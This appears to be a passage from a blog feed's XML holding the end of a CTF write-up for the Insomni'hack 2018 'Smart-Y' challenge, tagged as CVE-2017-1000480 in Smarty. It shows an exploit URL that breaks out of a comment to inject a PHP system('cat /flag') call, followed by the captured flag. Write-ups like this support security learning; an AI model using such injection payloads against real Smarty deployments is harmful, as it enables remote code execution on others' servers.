-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180123/13.jpg?raw=true" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://smart-y.teaser.insomnihack.ch/console.php?id=*/system(&apos;cat /flag&apos;);//</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180123/14.jpg?raw=true" alt=""></p>
-<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">INS&#123;why_being_so_smart-y&#125;</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;Insomni’hack teaser 2018-Smart-Y-writeup&lt;/p&gt;
-&lt;p&gt;CVE-2017-1000480-Smarty-3-1-32-php代码执行-漏洞&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
-    
-    
-      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
-    
-      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
     
   </entry>
   
